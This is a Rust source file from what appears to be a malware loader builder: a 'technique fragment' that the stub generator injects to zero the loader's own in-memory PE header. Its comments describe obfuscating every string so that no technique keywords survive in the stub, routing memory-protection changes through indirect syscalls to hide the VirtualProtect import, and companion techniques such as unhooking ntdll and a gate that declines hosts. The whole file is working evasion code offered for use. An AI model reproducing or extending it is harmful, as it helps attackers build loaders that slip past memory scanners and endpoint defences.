// --- Erase PE header (technique fragment) ---
//
// This file is injected verbatim into the generated stub when the technique is
// selected. It must be a self-contained Rust snippet: its own `use` statements
// plus the functions/constants the technique needs.
//
// A per-build value is rendered as a dollar-delimited placeholder token that
// `Params::render_fragment` replaces with the actual value. The delimiter is
// not valid Rust outside a macro, so `rustfmt` cannot parse the file and leaves
// the tokens untouched. Do NOT switch the delimiter to double braces: those are
// valid Rust (nested blocks) and `rustfmt` silently rewrites them, breaking the
// substitution.
//
// Every string that reaches the generated stub must be built through
// `StringsConfig::obfuscate` (see `src/techniques/README.md`).
//
// What the fragment does, in the loader's own process:
//   1. fetches the loader's image base with `GetModuleHandleA(NULL)` (the main
//      module; a loader entry point, like `LoadLibraryA` elsewhere — the `nt_*`
//      layer issues kernel calls, it does not map images),
//   2. reads `e_lfanew` from the DOS header,
//   3. reads `SizeOfHeaders` from the optional header — the same offset in
//      PE32 and PE32+,
//   4. makes the header pages writable through `crate::nt_protect_vm` (so
//      `mode: indirect` removes the `VirtualProtect` import),
//   5. zeroes the DOS header, the NT headers and the section table with
//      `write_bytes`,
//   6. restores the original protection.
//
// It runs last among the preparations: zeroing the header removes the data
// directories the loader itself needs for SEH / stack unwinding, so nothing
// after it may read the loader's header (see the README).

use core::ffi::c_void;

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::GetModuleHandleA;
use windows::Win32::System::Memory::PAGE_READWRITE;
use windows::Win32::System::Threading::GetCurrentProcess;

/// `IMAGE_DOS_HEADER::e_lfanew`: the NT headers' offset from the image base.
const E_LFANEW_OFFSET: usize = 0x3C;

/// `IMAGE_OPTIONAL_HEADER::SizeOfHeaders`, measured from the optional header's
/// start. It is a `u32` at this offset in both PE32 and PE32+.
const OPTIONAL_SIZE_OF_HEADERS_OFFSET: usize = 0x3C;

/// `IMAGE_NT_HEADERS` up to the optional header: the 4-byte signature plus the
/// 20-byte `IMAGE_FILE_HEADER`.
const NT_HEADERS_FIXED: usize = 24;

/// Byte offset of `SizeOfHeaders` from the image base: the NT header prefix
/// (`signature` + `IMAGE_FILE_HEADER`) plus the optional-header field offset.
const SIZE_OF_HEADERS_DELTA: usize = NT_HEADERS_FIXED + OPTIONAL_SIZE_OF_HEADERS_OFFSET;

/// Appends a failed `nt_*` call's NTSTATUS to an obfuscated message.
fn with_status(message: String, status: i32) -> String {
    format!("{message} (status 0x{:08x})", status as u32)
}

/// Zeroes the loader image's in-memory PE header.
///
/// The image base and every diagnostic are substituted at build time by
/// `Params::render_fragment` with code that rebuilds them at runtime, so no
/// technique keyword reaches the generated stub's strings.
pub fn erase_pe_header() -> Result<bool, String> {
    // 1. The image is already mapped, so this returns its base address; a NULL
    //    name means the main module (the loader's own image).
    let base = unsafe { GetModuleHandleA(PCSTR::null()) }
        .map_err(|_| $MSG_NO_IMAGE_BASE$)?
        .0 as usize;
    if base == 0 {
        return Err($MSG_NO_IMAGE_BASE$);
    }

    // 2. `e_lfanew` points at the `PE\0\0` signature, past the DOS header.
    let e_lfanew = unsafe { *((base + E_LFANEW_OFFSET) as *const u32) } as usize;

    // 3. `SizeOfHeaders` sits at base + e_lfanew + 0x54 for both header
    //    formats (0x3C into the optional header). A zero value means the
    //    offsets are not a mapped PE; refuse rather than zero an arbitrary
    //    length.
    let size_of_headers =
        unsafe { *((base + e_lfanew + SIZE_OF_HEADERS_DELTA) as *const u32) } as usize;
    if size_of_headers == 0 {
        return Err($MSG_BAD_SIZE_OF_HEADERS$);
    }
    crate::tech_dbg!(
        "erase_pe_header",
        "loader image {base:#x}, header {size_of_headers} bytes"
    );

    // 4. The header pages are never executed, so a plain RW window is enough
    //    (no RWX dance as in `unhook_ntdll`). The change goes through the
    //    syscall layer so `syscalls.mode: indirect` skips the userland stub;
    //    the kernel still sees the event.
    let process = unsafe { GetCurrentProcess() };
    let mut old_protect = 0u32;
    let status = crate::nt_protect_vm(
        process,
        base as *mut c_void,
        size_of_headers,
        PAGE_READWRITE.0,
        &mut old_protect,
    );
    if status < 0 {
        return Err(with_status($MSG_PROTECT_FAILED$, status));
    }

    // 5. Zero the DOS header, the NT headers and the section table.
    // SAFETY: `base` is the loader's mapped image (step 1) and the pages
    // covering `size_of_headers` bytes from it are writable (step 4).
    unsafe { core::ptr::write_bytes(base as *mut u8, 0, size_of_headers) };

    // 6. Put the original protection back before the next step runs, so the
    //    header pages are not left writable.
    let mut restored = 0u32;
    let status = crate::nt_protect_vm(
        process,
        base as *mut c_void,
        size_of_headers,
        old_protect,
        &mut restored,
    );
    if status < 0 {
        return Err(with_status($MSG_RESTORE_FAILED$, status));
    }

    crate::tech_dbg!(
        "erase_pe_header",
        "zeroed {size_of_headers} header bytes at {base:#x}"
    );
    // A Preparation always continues the pipeline unless it declines the host;
    // only the `bouncer` gate returns `Ok(false)` (see `techniques/README.md`).
    Ok(true)
}
